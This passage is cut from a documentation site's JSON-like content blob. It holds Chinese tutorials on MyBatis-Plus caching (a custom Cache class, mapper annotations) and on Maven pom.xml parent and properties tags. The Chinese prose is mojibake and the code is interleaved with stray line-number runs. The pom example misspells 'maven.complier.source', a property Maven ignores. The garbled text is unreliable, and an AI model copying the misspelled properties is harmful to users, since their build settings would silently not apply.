è·åç¼å­ä¸­é®å¼å¯¹çæ°é\n     * @return\n     */\n    @Override\n    public int getSize() {\n        return cache.size();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n\n\nå·ä½ç mapper\n\n@Mapper\n@CacheNamespace(implementation = MyCache.class,eviction = FifoCache.class)\npublic interface CacheThreeMapper extends BaseMapper<UserBean> {\n\n    @Select("select * from user")\n    List<UserBean> testAll();\n\n    @Select("select * from user where id = 1")\n    UserBean testOne();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n> æä»¬è¿å¯ä»¥å¨ mapper æ¥å£ä¸å  @CacheNamespaceRef æ³¨è§£ï¼å½æä»¬å¨ä¸ä¸ª Mapper æ¥å£ä¸­éè¦ä½¿ç¨å¶ä» Mapper æ¥å£æå®ä¹çç¼å­æ¶ï¼å¯ä»¥éè¿ @CacheNamespaceRef æ³¨è§£æ¥å®ç°ãè¯¥æ³¨è§£ç¨äºæå®å¦ä¸ä¸ª Mapper æ¥å£ç Class å¯¹è±¡ï¼è¡¨ç¤ºå½å Mapper æ¥å£éè¦å¼ç¨è¯¥æ¥å£æå®ä¹çç¼å­å½åç©ºé´ã@CacheNamespaceRef (XXXXXMapper.class)',normalizedContent:'# ä¸çº§ç¼å­\n\né¦åéè¦å¨ application.yml ä¸­è¿è¡éç½®\n\nmybatis-plus:\n  # æå®å·ä½xmlè·¯å¾ å¨è·¯å¾\n  mapper-locations: classpath*:/com/fengqianrun/mybatisplus/**/*mapper.xml\n  # è®¾ç½®å®ä½è·¯å¾ä½ç½®\n  type-aliases-package: com.fengqianrun.mybatisplus.bean\n  configuration:\n    # å¼å¯ä¸çº§ç¼å­,é»è®¤æ¯å¼å¯ç\n    local-cache-scope: session\n  globalconfig:\n    # å³é­ banner ææ\n    banner: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nå¶æ¬¡å¨æ¥è¯¢æ¹æ³ä¸ä½¿ç¨æ³¨è§£ @transactionalï¼@transactional ä»£è¡¨å°±åä¸ä¸ª sessionï¼æä»¬å¨è¿éé¢éå¤æ§è¡æ¥è¯¢ï¼å°±åªä¼æ¥è¯¢ä¸æ¬¡\n\n@transactional\n@getmapping("/testone")\npublic userbean testone(){\n    userbean userbean = cacheonemapper.testone();\n    userbean = null;\n    userbean = cacheonemapper.testone();\n    return userbean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# äºçº§ç¼å­\n\né¦åï¼å¨ application.yml éç½®æä»¶ä¸­æ·»å å¦ä¸éç½®ï¼\n\nmybatis-plus:\n  configuration:\n    # å¼å¯äºçº§ç¼å­\n    cache-enabled: true\n\n\n1\n2\n3\n4\n\n\nå¿é¡»å®ç°è¦ç»å¯¹è±¡è¿è¡ serializableï¼ä¾å¦ï¼\n\n@data\n@tablename("user")\npublic class userbean implements serializable {\n    // ...\n}\n\n\n1\n2\n3\n4\n5\n\n\næåï¼éè¦å¨ mapper æ¥å£ä¸­ä½¿ç¨ @cachenamespace ï¼ä½¿ç¨è¯¥æ³¨è§£å¯ä»¥æ¹ä¾¿å°ä¸ºæ¯ä¸ª mapper æ¥å£å®ä¹ç¬ç«çç¼å­ç©ºé´ï¼å¹¶æå®ä¸åçç¼å­å®ç°åç¼å­ç­ç¥ï¼ä»èæ´å¥½å°æ§å¶ç¼å­ææã\n\n@mapper\n@cachenamespace(eviction = fifocache.class)\npublic interface cachetwomapper extends basemapper<userbean> {\n    list<userbean> testall();\n    userbean testone();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nä½å¦æ mapper æ¥å£æå¯¹åºç xmlï¼åéè¦å¨ xml æè¿° cacheï¼ä½¿ç¨æ³¨è§£ @cachenamespace å°±ä¼å¤±æï¼ä¸¤ä¸ªä¸èµ·å­å¨å°±ä¼æ¥é\n\n<mapper namespace="com.fengqianrun.mybatisplus.cache2.cachetwomapper">\n    <cache eviction="fifo"/>\n    <select id="testall" resulttype="com.fengqianrun.mybatisplus.bean.userbean">\n        select * from user\n    </select>\n    <select id="testone" resulttype="com.fengqianrun.mybatisplus.bean.userbean">\n        select * from user where id = 1\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\näºçº§ç¼å­é»è®¤æåµä¸æ¯ä½¿ç¨ mybatis èªå¸¦ç perpetualcache å®ç°ï¼å¯ä»¥éè¿éç½®æä»¶ä¸­çå±æ§æ¥è®¾ç½®ç¼å­å®ç°ç±»åå¶ä»åæ°ãå¦å¤ï¼å¨ä½¿ç¨äºçº§ç¼å­æ¶ï¼\néè¦æ³¨æé¿åæ°æ®å¹¶åæ´æ°å¯¼è´èæ°æ®çé®é¢ï¼å¯ä»¥éè¿è®¾ç½®ç¼å­å·æ°æ¶é´ç­æ¹å¼æ¥è§£å³è¿ä¸ªé®é¢ã\n\n\n# èªå®ä¹ç¼å­\n\nå¦æä½ æ¯ä½åºç¨ç¨åºçè¯ï¼ä½¿ç¨ä»¥ä¸çéç½®æ¹å¼æ²¡æé®é¢ï¼ä½å¦æä½ æ¯åå¸å¼æå¾®æå¡ï¼é£ä¹å°±ä¼é ææ°æ®ä¸ä¸è´çé®é¢ï¼æ­¤æ¶æä»¬éè¦åå©å¶ä»ç¼å­ï¼æ¯å¦ redis æ¥ç¼å­æä»¬çæ¥è¯¢æ°æ®ãèªå®ä¹ç¼å­ä¹åªæ¯å¨äºçº§ç¼å­åºç¡ä¸çæ¹é ï¼æä»¥è§ååäºçº§ç¼å­ä¸æ ·ã\n\nå®ç° org.apache.ibatis.cache.cache ç±»\n\npublic class mycache implements cache {\n\n    /**\n     * id ä¼æ¯ mapper æ¥å£çåç§°\n     */\n    private final string id;\n\n    /**\n     * å¯ä»¥æ¿æ¢ä¸º redis\n     */\n    private map<object, object> cache = new concurrenthashmap<object, object>();\n\n    public mycache(string id) {\n        this.id = id;\n    }\n\n    /**\n     * ç¼å­å¯ä¸æ è¯\n     * @return\n     */\n    @override\n    public string getid() {\n        return id;\n    }\n\n    /**\n     * å°é®å¼å¯¹æ¾å¥ç¼å­ä¸­\n     * @param key\n     * @param value\n     */\n    @override\n    public void putobject(object key, object value) {\n        system.out.println("æ·»å -èªå®ä¹ç¼å­: "+key+"  "+value);\n        cache.put(key, value);\n    }\n\n    /**\n     * ä»ç¼å­ä¸­è·åæå®é®çå¼\n     * @param key\n     */\n    @override\n    public object getobject(object key) {\n        system.out.println("æ¥è¯¢-èªå®ä¹ç¼å­: "+key);\n        return cache.get(key);\n    }\n\n    /**\n     * ä»ç¼å­ä¸­ç§»é¤æå®é®çå¼\n     * @param key\n     */\n    @override\n    public object removeobject(object key) {\n        return cache.remove(key);\n    }\n\n    /**\n     * æ¸ç©ºç¼å­\n     */\n    @override\n    public void clear() {\n        cache.clear();\n    }\n\n    /**\n     * è·åç¼å­ä¸­é®å¼å¯¹çæ°é\n     * @return\n     */\n    @override\n    public int getsize() {\n        return cache.size();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n\n\nå·ä½ç mapper\n\n@mapper\n@cachenamespace(implementation = mycache.class,eviction = fifocache.class)\npublic interface cachethreemapper extends basemapper<userbean> {\n\n    @select("select * from user")\n    list<userbean> testall();\n\n    @select("select * from user where id = 1")\n    userbean testone();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n> æä»¬è¿å¯ä»¥å¨ mapper æ¥å£ä¸å  @cachenamespaceref æ³¨è§£ï¼å½æä»¬å¨ä¸ä¸ª mapper æ¥å£ä¸­éè¦ä½¿ç¨å¶ä» mapper æ¥å£æå®ä¹çç¼å­æ¶ï¼å¯ä»¥éè¿ @cachenamespaceref æ³¨è§£æ¥å®ç°ãè¯¥æ³¨è§£ç¨äºæå®å¦ä¸ä¸ª mapper æ¥å£ç class å¯¹è±¡ï¼è¡¨ç¤ºå½å mapper æ¥å£éè¦å¼ç¨è¯¥æ¥å£æå®ä¹çç¼å­å½åç©ºé´ã@cachenamespaceref (xxxxxmapper.class)',charsets:{cjk:!0}},{title:"pom æä»¶ä»ç»å parentãproperties æ ç­¾è¯¦è§£",frontmatter:{title:"pom æä»¶ä»ç»å parentãproperties æ ç­¾è¯¦è§£",date:"2023-06-25T09:22:36.000Z",permalink:"/maven/2300/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/03.maven/2300.pom%20%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D%E5%8F%8A%20parent%E3%80%81properties%20%E6%A0%87%E7%AD%BE%E8%AF%A6%E8%A7%A3.html",relativePath:"01.æ¡æ¶/03.maven/2300.pom æä»¶ä»ç»å parentãproperties æ ç­¾è¯¦è§£.md",key:"v-5ad0f62c",path:"/maven/2300/",headers:[{level:2,title:"pom.xml ä»ç»",slug:"pom-xml-ä»ç»",normalizedTitle:"pom.xml ä»ç»",charIndex:2},{level:2,title:"parent æ ç­¾è¯¦è§£",slug:"parent-æ ç­¾è¯¦è§£",normalizedTitle:"parent æ ç­¾è¯¦è§£",charIndex:4061},{level:2,title:"properties æ ç­¾è¯¦è§£",slug:"properties-æ ç­¾è¯¦è§£",normalizedTitle:"properties æ ç­¾è¯¦è§£",charIndex:4813}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"pom.xml ä»ç» parent æ ç­¾è¯¦è§£ properties æ ç­¾è¯¦è§£",content:'# pom.xml ä»ç»\n\npom ä½ä¸ºé¡¹ç®å¯¹è±¡æ¨¡åãéè¿ xml è¡¨ç¤º maven é¡¹ç®ï¼ä½¿ç¨ pom.xml æ¥å®ç°ãä¸»è¦æè¿°äºé¡¹ç®ï¼åæ¬éç½®æä»¶ï¼å¼åèéè¦éµå¾ªçè§åï¼ç¼ºé·ç®¡çç³»ç»ï¼ç»ç»å licensesï¼é¡¹ç®ç urlï¼é¡¹ç®çä¾èµæ§ï¼ä»¥åå¶ä»ææçé¡¹ç®ç¸å³å ç´ ã\n\npom ä¸­çæè¿°ä¿¡æ¯é½æ¯ç¨ xml æ ç­¾çæ¹å¼ï¼å¶ä¸­åå«åæ ç­¾ååæ ç­¾ï¼æé¡¶é¨ç¨äºæè¿° xml å¾çæ¬åç¼ç ï¼å¶æ¬¡æ¯ä»¥ project å¼å¤´å¾åæ ç­¾å¹¶è¡¨ç¤ºä¸ºä¸ä¸ªé¡¹ç®ï¼å®ä¹äºè¯¥é¡¹ç®å¯ç¨åå®¹åè§èã\n\n# åæ ç­¾\n<project></project>\n\n# åæ ç­¾\n<project/>\n\n\n1\n2\n3\n4\n5\n\n\nå¯¹äº pom å¯ç¨åå®¹è¾å¤ï¼ä¸çº§æ ç­¾æå¦ä¸è¡¨æç¤ºï¼ä½å¸¸ç¨çé½ä¼æå¯¹åºçæè¿°\n\næ ç­¾                       æè¿°\nmodelVersion             å½åæ¨¡åä½¿ç¨ççæ¬\nparent                   ç»§æ¿æä¸ª pomï¼é¨åæ¯ä¸å¯ç»§æ¿ç\ngroupId                  å¬å¸æç»ç»çå¯ä¸æ è¯ï¼å¦ org.springframework.boot ç¬¬ä¸æ®µæ¯åï¼orgãcom\n                         éçå©ç»ç»ãåä¸ç»ç»ï¼ï¼ç¬¬äºæ®µæ¯å¬å¸åç§°ï¼ç¬¬ä¸æ®µæ¯åºç¨åç§°\nartifactId               é¡¹ç®çå¯ä¸ ID\nversion                  é¡¹ç®æå±ççæ¬å·\nname                     é¡¹ç®åç§°\ndescription              é¡¹ç®æè¿°ä¿¡æ¯\nproperties               éç½®ä¿¡æ¯æè¿°ï¼æ´å¤çæ¯æè¿°ä¾èµ jar çæ¬ãé¡¹ç®çæ¬ç­\ndependencies             æè¦ä¾èµç jar é½éè¦å¨è¿éæè¿°\nbuild                    æå»ºä¿¡æ¯ï¼åæ¬æä»¶ï¼èµæºæä»¶ä¿¡æ¯ç­\nprofiles                 ä½ç¨äºé¡¹ç®ç¯å¢çåæ¢ï¼devãtestãproduceï¼\npackaging                æè¿°é¡¹ç®çç±»åï¼å¯é pomãjarãwar\nrepositories             ç¨æ¯ç¨æ¥éç½® maven é¡¹ç®çè¿ç¨ä»åºï¼å¯ä»¥æ¯ç§æï¼nexusï¼\nmodules                  ç¨æ¥éç½®å­é¡¹ç®\ndependencyManagement     ç¨æ¥æä¾äºä¸ç§ç®¡çä¾èµçæ¬å·çæ¹å¼ãéå¸¸ä¼å¨é¡¹ç®çæé¡¶å±çç¶ POM ä¸­çå°è¯¥åç´ ãä½¿ç¨ pom.xml ä¸­ç\n                         dependencyManagement åç´ è½è®©ææå¨å­é¡¹ç®ä¸­å¼ç¨ä¸ä¸ªä¾èµèä¸ç¨æ¾å¼çååºçæ¬å·\ndistributionManagement   ç¨äºååæä»¶å°è¿ç¨ä»åºï¼mvn install ä¼å°é¡¹ç®çæçæä»¶å®è£å°æ¬å° Maven ä»åºï¼mvn deploy\n                         ç¨æ¥å°é¡¹ç®çæçæä»¶ååå°è¿ç¨ Maven ä»åºãæ¬å° Maven ä»åºçæä»¶åªè½ä¾å½åç¨æ·ä½¿ç¨ï¼å¨ååå°è¿ç¨\n                         Maven ä»åºä¹åï¼ææè½è®¿é®è¯¥ä»åºçç¨æ·é½è½ä½¿ç¨ä½ çæä»¶ã\npluginRepositories       éç½® Maven ä»ä»ä¹å°æ¹ä¸è½½æä»¶\nscm                      éæäºè½¯ä»¶éç½®ç®¡ççï¼ä»å¯ä»¥æ¯ææä»¬å¸¸ç¨ SVNãCVS ç­\ndevelopers               éç½®å¼åèä¿¡æ¯ï¼ä¾å¦ï¼ä¸ä¸ªå¼åèå¯ä»¥æå¤ä¸ª rolesï¼properties\nissueManagement          bug è·è¸ªç®¡çç³»ç»ï¼å®ä¹ defect tracking system ç¼ºé·è·è¸ªç³»ç»\nreporting                åå« site çæé¶æ®µçä¸äºåç´ ï¼æäº maven plugin å¯ä»¥çæ reports å¹¶ä¸å¨ reporting\n                         ä¸éç½®\nurl                      å¼åå¢éçç½ç«ï¼æ å³ç´§è¦å¯é\nlicenses                 è®¸å¯è¯ä¿¡æ¯éç½®\norganization             éç½®ç»ç»ä¿¡æ¯\nciManagement             ?\ncontributors             ?\ninceptionYear            ?\nmailingLists             ?\nprerequisites            ?\nreports                  ?\n\nä»¥ä¸ä¸ª spring boot å¸¸è§é¡¹ç®åä¸ºç¤ºä¾ï¼\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n    \x3c!-- ç»§æ¿spring-bootä½¿ç¨ä»çç¸å³ä¾èµ --\x3e\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.6.9</version>\n        <relativePath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n    \x3c!-- ç»ç»ï¼åºç¨ --\x3e\n    <groupId>com.xxx.boot</groupId>\n    \x3c!-- é¡¹ç®IDï¼ä¸è¬é½åæ¬¢æ¯åç§° --\x3e\n    <artifactId>framework</artifactId>\n    \x3c!-- çæ¬ --\x3e\n    <version>0.0.1-SNAPSHOT</version>\n    \x3c!-- é¡¹ç®åç§° --\x3e\n    <name>newFramework</name>\n    <description>Demo project for Spring Boot</description>\n    \x3c!-- éç½®æè¿° --\x3e\n    <properties>\n        \x3c!-- javaçæ¬ï¼ä½è¿ä¸ªå®éæ²¡ä»ä¹ç¨ï¼ååä¸ç§æè¿°ä¿¡æ¯ç --\x3e\n        <java.version>17</java.version>\n        \x3c!-- å®éæå®ç¼è¯çæ¬å¯ä»¥ä½¿ç¨å¦ä¸ --\x3e\n        <maven.complier.source>17</maven.complier.source>\n        <maven.complier.target>17</maven.complier.target>\n    </properties>\n    \n    \x3c!-- ä¾èµ --\x3e\n    <dependencies>\n        \x3c!-- å·ä½ä¾èµ --\x3e\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n    \x3c!-- æå»ºä¿¡æ¯ --\x3e\n    <build>\n        \x3c!-- æä»¶ --\x3e\n        <plugins>\n            <plugin>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-maven-plugin</artifactId>\n            </plugin>\n        </plugins>\n    </build>\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n# parent æ ç­¾è¯¦è§£\n\n<parent></parent> æ ç­¾ç¨äºç»§æ¿ç¶é¡¹ç®çåç±»ä¾èµåå¶ä»éç½®ä¿¡æ¯ï¼å¦çæ¬ï¼æå»ºä¿¡æ¯ï¼éç½®æè¿°ç­ï¼å·ä½èå´åæ¬ï¼\n\n# å¯ä»¥ç»§æ¿é¨å\ngroupIdãversionãdescriptionãurlãinceptionYearãorganizationãlicensesãdevelopersãcontributorsãmailingListsãscmãissueManagementãciManagementãpropertiesãdependencyManagementãdependenciesãrepositoriesãpluginRepositoriesãbuildãreportingãprofiles\n\n# ä¸å¯ç»§æ¿é¨å\nartifactIdãnameãprerequisites\n\n\n1\n2\n3\n4\n5\n\n\nä¸ä¸ª parent éæåå«å¨é¨åå®¹æï¼\n\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>2.6.9</version>\n    <relativePath/>\n</parent>\n\n\n1\n2\n3\n4\n5\n6\n\n\n<relativePath/> åç´ ï¼å®å¯ä»¥åæ ç­¾ä¹å¯ä»¥æ¯åæ ç­¾ <relativePath>../my-parent</relativePath> ãå®ä¸æ¯å¿éçï¼ä½å¯ä»¥ç¨ä½ Maven çæç¤ºç¬¦ï¼ç¶ååæç´¢è¯¥é¡¹ç®çç¶çº§çç»å®è·¯å¾ï¼ç¶ååæç´¢æ¬å°åè¿ç¨å­å¨åºï¼åæ ç­¾ä¸ºé»è®¤ä»å½å pom.xml çç¶çº§ç®å½æ¥æ¾ã\n\n\n# properties æ ç­¾è¯¦è§£\n\n<properties></properties> æ²¡ææä¾ä»ä¹å®è´¨æ§çåå®¹ä¾æä»¬ä½¿ç¨ï¼æ£æ¥ä¸æ¥å¨éé¢æå¤å¯ä»¥å¨æè¿°ä¸ä¸ª <project></project> æ ç­¾å¯ç¨ï¼ä½ä½ç¨å¹¶ä¸æ¯ä¸å¤§ãå®éä½ç¨æ´å¤å¨äºæè¿°æä»¬ä¾èµ jar ççæ¬ç­ã\n\n<properties>\n    \x3c!-- javaçæ¬ï¼ä½è¿ä¸ªå®éæ²¡ä»ä¹ç¨ï¼ååä¸ç§æè¿°ä¿¡æ¯ç --\x3e\n    <java.version>17</java.version>\n    \x3c!-- å®éæå®ç¼è¯çæ¬å¯ä»¥ä½¿ç¨å¦ä¸ --\x3e\n    <maven.complier.source>17</maven.complier.source>\n    <maven.complier.target>17</maven.complier.target>\n    \x3c!-- å®ä¹lombokçæ¬ --\x3e\n    <lombok.version>1.18.24</lombok.version>\n    <project.version>0.0.1-SNAPSHOT</project.version>\n</properties>\n\x3c!-- é¡¹ç®çæ¬ --\x3e\n<version>${project.version}</version>\n\x3c!-- ä¾èµ --\x3e\n<dependencies>\n    <dependency>\n        <groupId>org.projectlombok</groupId>\n        <artifactId>lombok</artifactId>\n        <version>${lombok.version}</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',normalizedContent:'# pom.xml ä»ç»\n\npom ä½ä¸ºé¡¹ç®å¯¹è±¡æ¨¡åãéè¿ xml è¡¨ç¤º maven é¡¹ç®ï¼ä½¿ç¨ pom.xml æ¥å®ç°ãä¸»è¦æè¿°äºé¡¹ç®ï¼åæ¬éç½®æä»¶ï¼å¼åèéè¦éµå¾ªçè§åï¼ç¼ºé·ç®¡çç³»ç»ï¼ç»ç»å licensesï¼é¡¹ç®ç urlï¼é¡¹ç®çä¾èµæ§ï¼ä»¥åå¶ä»ææçé¡¹ç®ç¸å³å ç´ ã\n\npom ä¸­çæè¿°ä¿¡æ¯é½æ¯ç¨ xml æ ç­¾çæ¹å¼ï¼å¶ä¸­åå«åæ ç­¾ååæ ç­¾ï¼æé¡¶é¨ç¨äºæè¿° xml å¾çæ¬åç¼ç ï¼å¶æ¬¡æ¯ä»¥ project å¼å¤´å¾åæ ç­¾å¹¶è¡¨ç¤ºä¸ºä¸ä¸ªé¡¹ç®ï¼å®ä¹äºè¯¥é¡¹ç®å¯ç¨åå®¹åè§èã\n\n# åæ ç­¾\n<project></project>\n\n# åæ ç­¾\n<project/>\n\n\n1\n2\n3\n4\n5\n\n\nå¯¹äº pom å¯ç¨åå®¹è¾å¤ï¼ä¸çº§æ ç­¾æå¦ä¸è¡¨æç¤ºï¼ä½å¸¸ç¨çé½ä¼æå¯¹åºçæè¿°\n\næ ç­¾                       æè¿°\nmodelversion             å½åæ¨¡åä½¿ç¨ççæ¬\nparent                   ç»§æ¿æä¸ª pomï¼é¨åæ¯ä¸å¯ç»§æ¿ç\ngroupid                  å¬å¸æç»ç»çå¯ä¸æ è¯ï¼å¦ org.springframework.boot ç¬¬ä¸æ®µæ¯åï¼orgãcom\n                         éçå©ç»ç»ãåä¸ç»ç»ï¼ï¼ç¬¬äºæ®µæ¯å¬å¸åç§°ï¼ç¬¬ä¸æ®µæ¯åºç¨åç§°\nartifactid               é¡¹ç®çå¯ä¸ id\nversion                  é¡¹ç®æå±ççæ¬å·\nname                     é¡¹ç®åç§°\ndescription              é¡¹ç®æè¿°ä¿¡æ¯\nproperties               éç½®ä¿¡æ¯æè¿°ï¼æ´å¤çæ¯æè¿°ä¾èµ jar çæ¬ãé¡¹ç®çæ¬ç­\ndependencies             æè¦ä¾èµç jar é½éè¦å¨è¿éæè¿°\nbuild                    æå»ºä¿¡æ¯ï¼åæ¬æä»¶ï¼èµæºæä»¶ä¿¡æ¯ç­\nprofiles                 ä½ç¨äºé¡¹ç®ç¯å¢çåæ¢ï¼devãtestãproduceï¼\npackaging                æè¿°é¡¹ç®çç±»åï¼å¯é pomãjarãwar\nrepositories             ç¨æ¯ç¨æ¥éç½® maven é¡¹ç®çè¿ç¨ä»åºï¼å¯ä»¥æ¯ç§æï¼nexusï¼\nmodules                  ç¨æ¥éç½®å­é¡¹ç®\ndependencymanagement     ç¨æ¥æä¾äºä¸ç§ç®¡çä¾èµçæ¬å·çæ¹å¼ãéå¸¸ä¼å¨é¡¹ç®çæé¡¶å±çç¶ pom ä¸­çå°è¯¥åç´ ãä½¿ç¨ pom.xml ä¸­ç\n                         dependencymanagement åç´ è½è®©ææå¨å­é¡¹ç®ä¸­å¼ç¨ä¸ä¸ªä¾èµèä¸ç¨æ¾å¼çååºçæ¬å·\ndistributionmanagement   ç¨äºååæä»¶å°è¿ç¨ä»åºï¼mvn install ä¼å°é¡¹ç®çæçæä»¶å®è£å°æ¬å° maven ä»åºï¼mvn deploy\n                         ç¨æ¥å°é¡¹ç®çæçæä»¶ååå°è¿ç¨ maven ä»åºãæ¬å° maven ä»åºçæä»¶åªè½ä¾å½åç¨æ·ä½¿ç¨ï¼å¨ååå°è¿ç¨\n                         maven ä»åºä¹åï¼ææè½è®¿é®è¯¥ä»åºçç¨æ·é½è½ä½¿ç¨ä½ çæä»¶ã\npluginrepositories       éç½® maven ä»ä»ä¹å°æ¹ä¸è½½æä»¶\nscm                      éæäºè½¯ä»¶éç½®ç®¡ççï¼ä»å¯ä»¥æ¯ææä»¬å¸¸ç¨ svnãcvs ç­\ndevelopers               éç½®å¼åèä¿¡æ¯ï¼ä¾å¦ï¼ä¸ä¸ªå¼åèå¯ä»¥æå¤ä¸ª rolesï¼properties\nissuemanagement          bug è·è¸ªç®¡çç³»ç»ï¼å®ä¹ defect tracking system ç¼ºé·è·è¸ªç³»ç»\nreporting                åå« site çæé¶æ®µçä¸äºåç´ ï¼æäº maven plugin å¯ä»¥çæ reports å¹¶ä¸å¨ reporting\n                         ä¸éç½®\nurl                      å¼åå¢éçç½ç«ï¼æ å³ç´§è¦å¯é\nlicenses                 è®¸å¯è¯ä¿¡æ¯éç½®\norganization             éç½®ç»ç»ä¿¡æ¯\ncimanagement             ?\ncontributors             ?\ninceptionyear            ?\nmailinglists             ?\nprerequisites            ?\nreports                  ?\n\nä»¥ä¸ä¸ª spring boot å¸¸è§é¡¹ç®åä¸ºç¤ºä¾ï¼\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0" xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n    \x3c!-- ç»§æ¿spring-bootä½¿ç¨ä»çç¸å³ä¾èµ --\x3e\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.6.9</version>\n        <relativepath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n    \x3c!-- ç»ç»ï¼åºç¨ --\x3e\n    <groupid>com.xxx.boot</groupid>\n    \x3c!-- é¡¹ç®idï¼ä¸è¬é½åæ¬¢æ¯åç§° --\x3e\n    <artifactid>framework</artifactid>\n    \x3c!-- çæ¬ --\x3e\n    <version>0.0.1-snapshot</version>\n    \x3c!-- é¡¹ç®åç§° --\x3e\n    <name>newframework</name>\n    <description>demo project for spring boot</description>\n    \x3c!-- éç½®æè¿° --\x3e\n    <properties>\n        \x3c!-- javaçæ¬ï¼ä½è¿ä¸ªå®éæ²¡ä»ä¹ç¨ï¼ååä¸ç§æè¿°ä¿¡æ¯ç --\x3e\n        <java.version>17</java.version>\n        \x3c!-- å®éæå®ç¼è¯çæ¬å¯ä»¥ä½¿ç¨å¦ä¸ --\x3e\n        <maven.complier.source>17</maven.complier.source>\n        <maven.complier.target>17</maven.complier.target>\n    </properties>\n    \n    \x3c!-- ä¾èµ --\x3e\n    <dependencies>\n        \x3c!-- å·ä½ä¾èµ --\x3e\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-web</artifactid>\n        </dependency>\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-test</artifactid>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n    \x3c!-- æå»ºä¿¡æ¯ --\x3e\n    <build>\n        \x3c!-- æä»¶ --\x3e\n        <plugins>\n            <plugin>\n                <groupid>org.springframework.boot</groupid>\n                <artifactid>spring-boot-maven-plugin</artifactid>\n            </plugin>\n        </plugins>\n    </build>\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n# parent æ ç­¾è¯¦è§£\n\n<parent></parent> æ ç­¾ç¨äºç»§æ¿ç¶é¡¹ç®çåç±»ä¾èµåå¶ä»éç½®ä¿¡æ¯ï¼å¦çæ¬ï¼æå»ºä¿¡æ¯ï¼éç½®æè¿°ç­ï¼å·ä½èå´åæ¬ï¼\n\n# å¯ä»¥ç»§æ¿é¨å\ngroupidãversionãdescriptionãurlãinceptionyearãorganizationãlicensesãdevelopersãcontributorsãmailinglistsãscmãissuemanagementãcimanagementãpropertiesãdependencymanagementãdependenciesãrepositoriesãpluginrepositoriesãbuildãreportingãprofiles\n\n# ä¸å¯ç»§æ¿é¨å\nartifactidãnameãprerequisites\n\n\n1\n2\n3\n4\n5\n\n\nä¸ä¸ª parent éæåå«å¨é¨åå®¹æï¼\n\n<parent>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-parent</artifactid>\n    <version>2.6.9</version>\n    <relativepath/>\n</parent>\n\n\n1\n2\n3\n4\n5\n6\n\n\n<relativepath/> åç´ ï¼å®å¯ä»¥åæ ç­¾ä¹å¯ä»¥æ¯åæ ç­¾ <relativepath>../my-parent</relativepath> ãå®ä¸æ¯å¿éçï¼ä½å¯ä»¥ç¨ä½ maven çæç¤ºç¬¦ï¼ç¶åå